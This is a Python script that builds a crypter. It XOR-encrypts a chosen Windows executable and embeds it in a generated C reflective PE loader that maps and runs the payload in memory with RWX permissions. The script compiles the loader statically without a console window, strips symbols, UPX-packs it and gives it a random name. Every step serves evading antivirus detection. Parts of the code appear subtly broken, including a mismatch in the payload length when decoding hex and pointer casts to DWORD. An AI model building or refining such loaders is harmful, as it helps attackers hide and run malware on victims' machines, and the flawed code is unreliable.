import os
import sys
import subprocess
import random
import string
import shutil

def generate_random_name():
    return ''.join(random.choices(string.ascii_lowercase + string.digits, k=8))

def build_single_exe_with_dll(exe_path):
    print("=" * 60)
    print("PROFESSIONAL REFLECTIVE DLL LOADER")
    print("=" * 60)
    
    if not os.path.exists(exe_path):
        print(f"EXE not found: {exe_path}")
        return None
    
    output_dir = os.path.dirname(exe_path)
    
    print("Reading source EXE...")
    with open(exe_path, 'rb') as f:
        exe_data = f.read()
    
    print(f"Source size: {len(exe_data) / (1024*1024):.1f} MB")
    
    if len(exe_data) < 2 or exe_data[0] != 0x4D or exe_data[1] != 0x5A:
        print("ERROR: Not a valid EXE file (missing MZ header)!")
        return None
    print("EXE header OK (MZ)")
    
    print("Encrypting with XOR...")
    key = os.urandom(32)
    encrypted = bytearray()
    for i, byte in enumerate(exe_data):
        encrypted.append(byte ^ key[i % len(key)])
    
    # Встраиваем данные как массив байт
    data_hex = encrypted.hex()
    key_hex = key.hex()
    
    print("Creating reflective loader...")
    
    loader_code = f'''
#include <windows.h>
#include <stdio.h>
#include <stdlib.h>

#pragma comment(linker, "/SUBSYSTEM:WINDOWS")
#pragma comment(linker, "/ENTRY:mainCRTStartup")
#pragma comment(linker, "/MERGE:.rdata=.data")
#pragma comment(linker, "/MERGE:.text=.data")
#pragma comment(linker, "/SECTION:.data,EWR")

// Encrypted payload
static const unsigned char payload[] = 
    "{data_hex}";
static const size_t payload_len = {len(encrypted)};

static const unsigned char xkey[] = 
    "{key_hex}";
static const size_t key_len = {len(key)};

// Hex to byte
unsigned char h2b(char c) {{
    if (c >= '0' && c <= '9') return c - '0';
    if (c >= 'a' && c <= 'f') return c - 'a' + 10;
    if (c >= 'A' && c <= 'F') return c - 'A' + 10;
    return 0;
}}

// Reflective PE loader
void run_pe(unsigned char* pe_data, size_t pe_size) {{
    // Check MZ
    if (pe_data[0] != 'M' || pe_data[1] != 'Z') return;
    
    // Get PE header
    PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)pe_data;
    PIMAGE_NT_HEADERS nt = (PIMAGE_NT_HEADERS)(pe_data + dos->e_lfanew);
    
    if (nt->Signature != IMAGE_NT_SIGNATURE) return;
    
    // Allocate memory in current process
    size_t image_size = nt->OptionalHeader.SizeOfImage;
    unsigned char* base = (unsigned char*)VirtualAlloc(
        NULL, image_size, MEM_COMMIT | MEM_RESERVE, 
        PAGE_EXECUTE_READWRITE
    );
    if (!base) return;
    
    // Copy headers
    memcpy(base, pe_data, nt->OptionalHeader.SizeOfHeaders);
    
    // Copy sections
    PIMAGE_SECTION_HEADER section = IMAGE_FIRST_SECTION(nt);
    for (int i = 0; i < nt->FileHeader.NumberOfSections; i++) {{
        if (section[i].SizeOfRawData) {{
            memcpy(base + section[i].VirtualAddress, 
                   pe_data + section[i].PointerToRawData, 
                   section[i].SizeOfRawData);
        }}
    }}
    
    // Relocations
    DWORD delta = (DWORD)base - nt->OptionalHeader.ImageBase;
    if (delta) {{
        PIMAGE_BASE_RELOCATION rel = (PIMAGE_BASE_RELOCATION)(
            base + nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress
        );
        while (rel->VirtualAddress) {{
            DWORD count = (rel->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(WORD);
            WORD* entries = (WORD*)(rel + 1);
            for (DWORD i = 0; i < count; i++) {{
                if (entries[i] >> 12 == IMAGE_REL_BASED_HIGHLOW) {{
                    DWORD* addr = (DWORD*)(base + rel->VirtualAddress + (entries[i] & 0xFFF));
                    *addr += delta;
                }}
            }}
            rel = (PIMAGE_BASE_RELOCATION)((char*)rel + rel->SizeOfBlock);
        }}
    }}
    
    // IAT
    PIMAGE_IMPORT_DESCRIPTOR imp = (PIMAGE_IMPORT_DESCRIPTOR)(
        base + nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress
    );
    while (imp->Name) {{
        HMODULE h = LoadLibraryA((char*)base + imp->Name);
        PIMAGE_THUNK_DATA thunk = (PIMAGE_THUNK_DATA)(base + imp->OriginalFirstThunk);
        PIMAGE_THUNK_DATA func = (PIMAGE_THUNK_DATA)(base + imp->FirstThunk);
        while (thunk->u1.Function) {{
            if (thunk->u1.Ordinal & IMAGE_ORDINAL_FLAG) {{
                func->u1.Function = (DWORD)GetProcAddress(h, (char*)(thunk->u1.Ordinal & 0xFFFF));
            }} else {{
                PIMAGE_IMPORT_BY_NAME name = (PIMAGE_IMPORT_BY_NAME)(base + thunk->u1.AddressOfData);
                func->u1.Function = (DWORD)GetProcAddress(h, name->Name);
            }}
            thunk++;
            func++;
        }}
        imp++;
    }}
    
    // TLS
    if (nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_TLS].VirtualAddress) {{
        PIMAGE_TLS_DIRECTORY tls = (PIMAGE_TLS_DIRECTORY)(
            base + nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_TLS].VirtualAddress
        );
        if (tls->AddressOfCallBacks) {{
            PIMAGE_TLS_CALLBACK* callback = (PIMAGE_TLS_CALLBACK*)tls->AddressOfCallBacks;
            while (*callback) {{
                (*callback)(base, DLL_PROCESS_ATTACH, NULL);
                callback++;
            }}
        }}
    }}
    
    // Entry point
    DWORD entry = nt->OptionalHeader.AddressOfEntryPoint;
    if (entry) {{
        ((void(*)()) (base + entry))();
    }}
}}

void run_payload() {{
    // Decrypt
    unsigned char* decrypted = (unsigned char*)malloc(payload_len / 2);
    if (!decrypted) return;
    
    for(size_t i = 0; i < payload_len / 2; i++) {{
        decrypted[i] = (h2b(payload[i*2]) << 4) | h2b(payload[i*2+1]);
    }}
    
    // XOR decrypt
    for(size_t i = 0; i < payload_len / 2; i++) {{
        decrypted[i] ^= xkey[i % key_len];
    }}
    
    // Run reflective PE
    run_pe(decrypted, payload_len / 2);
    
    free(decrypted);
}}

int main() {{
    run_payload();
    Sleep(15000);
    return 0;
}}
'''
    
    loader_src = os.path.join(output_dir, 'loader.c')
    with open(loader_src, 'w', encoding='utf-8') as f:
        f.write(loader_code)
    
    print("Compiling reflective loader...")
    loader_exe = os.path.join(output_dir, f'loader_{generate_random_name()}.exe')
    
    cmd = [
        'gcc',
        loader_src,
        '-o', loader_exe,
        '-O3',
        '-s',
        '-static',
        '-Wl,--subsystem,windows',
        '-mwindows'
    ]
    
    try:
        result = subprocess.run(cmd, check=True, capture_output=True)
        print("Compilation OK")
    except subprocess.CalledProcessError as e:
        print(f"Compilation failed: {e.stderr.decode()}")
        return None
    
    print("Compressing with UPX...")
    try:
        subprocess.run(['upx', '--best', loader_exe], capture_output=True, check=True)
        print("UPX compression OK")
    except:
        print("UPX compression skipped or failed")
    
    final_size = os.path.getsize(loader_exe) / (1024 * 1024)
    
    print("=" * 60)
    print("DONE")
    print(f"Output: {loader_exe}")
    print(f"Size: {final_size:.2f} MB")
    print("=" * 60)
    
    try:
        os.remove(loader_src)
    except:
        pass
    
    return loader_exe

if __name__ == "__main__":
    exe_path = "dist/temp.exe"
    
    if len(sys.argv) > 1:
        exe_path = sys.argv[1]
    
    if not os.path.exists(exe_path):
        print(f"EXE not found: {exe_path}")
        sys.exit(1)
    
    build_single_exe_with_dll(exe_path)
